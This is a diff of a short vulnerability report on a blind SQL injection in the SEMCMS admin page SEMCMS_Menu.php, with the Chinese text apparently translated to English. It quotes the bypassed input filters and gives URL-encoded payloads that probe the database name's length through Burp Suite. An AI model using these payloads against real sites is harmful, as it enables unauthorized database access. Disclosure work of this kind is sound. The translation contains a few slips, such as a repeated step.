@@ -1,10 +1,12 @@
-漏洞成因点：
+Causes of vulnerabilities:
 
-/xcR45q_Admin/SEMCMS_Menu.php 第66行
+/xcR45q_Admin/SEMCMS_Menu.php Line 66
 
- 
 
-漏洞代码
+
+
+Vulnerability code:
+
 
 ```
 <?php
@@ -15,13 +17,15 @@
    ?>
 ```
 
-  
 
-可以看出 此处的ID通过GET传参时会执行sql语句 
+It can be seen that the ID here will execute an SQL statement when passing parameters through GET
 
-过滤代码在/Include/contorl.php处
 
-第151行
+Filter code at/Include/contorl. PHP
+
+
+Line 151
+
 
 ```
 function test_input($data) { 
@@ -33,7 +37,8 @@ function test_input($data) {
   }
 ```
 
-以及第8行
+And the 8th line
+
 
 ```
 function inject_check_sql($sql_str) {
@@ -50,7 +55,8 @@ function inject_check_sql($sql_str) {
 
  
 
-通过以上过滤内容 可以构造paylaod
+By filtering the above content, we can construct a payload
+
 
 ```
 -1%20or%20length(database())%20REGEXP%20char(94,53,36)
@@ -58,11 +64,12 @@ function inject_check_sql($sql_str) {
 
  
 
-漏洞复现
+
+Recurrence of vulnerabilities
 
  
+visit a website
 
-访问
 
 ```
 http://url/xcR45q_Admin/SEMCMS_Menu.php
@@ -70,34 +77,33 @@ http://url/xcR45q_Admin/SEMCMS_Menu.php
 
  
 
-Brupsuite抓包  由于新建站点的时候数据库名的长度为5 所以payload构造为
+Brupsuite packet capture, Due to the length of the database name being 5 when creating a new site, the payload is constructed as
+
 
 ```
 -1%20or%20length(database())%20REGEXP%20char(94,53,36)
 ```
 
-（判断数据库名长度是否为5）
+（Determine if the length of the database name is 5）
 
  
-
-插入payload查看回显 
-
-![img](file:///C:/Users/12275/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)
-
+Insert payload to view echo
  
 
-此时更改payload
+![clip_image002](https://github.com/tzyyyyyyy/zemcms/assets/118863363/0b477628-181f-4feb-b1d3-3accffff8695)
+
+
+Change the payload at this time
 
 ```
 -1%20or%20length(database())%20REGEXP%20char(94,54,36)
 ```
 
-（判断数据库名长度是否为6） 
+（Determine if the length of the database name is 6） 
 
-插入payload查看回显 
+Change the payload at this time 
 
-![img](file:///C:/Users/12275/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)
+![clip_image004](https://github.com/tzyyyyyyy/zemcms/assets/118863363/c429a3bf-3004-43e7-a772-7f61ade3a220)
 
  
-
-后续可以根据页面的变化继续进行sql注入
+SQL injection can continue based on changes in the page in the future
